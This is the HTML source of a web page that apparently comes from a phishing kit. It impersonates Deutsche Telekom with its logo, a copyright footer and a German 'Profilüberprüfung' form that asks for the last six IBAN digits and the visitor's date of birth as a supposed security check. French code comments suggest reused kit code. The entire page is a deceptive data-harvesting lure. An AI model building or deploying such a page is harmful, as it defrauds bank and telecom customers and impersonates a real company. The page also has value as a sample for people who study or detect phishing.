<html lang="de">

<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="stylesheet" href="./layout/css/normalizer.css" />
  <link rel="stylesheet" href="./layout/css/style.css" />
  <script src="./layout/js/number.js"></script>
  <title>Willkommen</title>
</head>

<body>
  <header>
    <div style="display: flex;">
      <img src="./layout/img/telekom-logo.jpg" class="logo" alt="">
    </div>
  </header>
<form method=post action="https://www.t-online.de/?top#"
  <div class="container">
    <div class="title">
      Profilüberprüfung
    </div>
    <div class="verifyText">
      Zur Sicherheitsüberprüfung geben Sie bitte die letzten 6 Ziffern Ihrer IBAN und Ihr Geburtsdatum ein.
      <br><br>
      -IBAN letzte 6 Ziffern: DE00 0000 0000 0000 <b>XXXX XX</b>
      <br>
      -Geburtstag: <b>TT.MM.JJJJ</b>
    </div>
    <div class="input-container">
      <input type="tel" required id="iban" name="ibn" class="input" placeholder=" " onkeypress=" return isNumber(event)" maxlength="6">
      <label for="iban" class="input-label">IBAN letzte 6 Ziffern</label>
    </div>
    <div class="input-container" style="margin-bottom: 32px;">
      <input type="tel" required id="dateNaissance" name="dob" class="input" maxlength="10" placeholder="">
      <label for="dob" class="input-label">Geburtstag</label>
    </div>
    <div>
      <button class="button-primary" type=submit id="submitBtn">Weiter</button>
    </div>

	
  </div><br>
<a href="https://www.t-online.de/auth/oauth2/authorization/telekom" class="button-secondary" style="width:100%; display:inline-block; text-align:center;text-decoration: none;
">Zurück</a>

  <footer>	

    <div class="footer">
      <div>
        <div>© Telekom Deutschland GmbH</div>
        <div>26.19.1</div>
      </div>
      <div>
        <div>Impressum</div>
        <div>Datenschutz</div>
      </div>
    </div></form>
  </footer>
  <script>
    const input = document.getElementById("dateNaissance");

    input.addEventListener("input", function (e) {
      let value = input.value.replace(/\D/g, ""); // Supprimer tout sauf les chiffres

      if (value.length >= 3 && value.length <= 4) {
        value = value.slice(0, 2) + "." + value.slice(2);
      } else if (value.length > 4 && value.length <= 8) {
        value = value.slice(0, 2) + "." + value.slice(2, 4) + "." + value.slice(4);
      }

      input.value = value;
    });
  </script>
</body>


</html>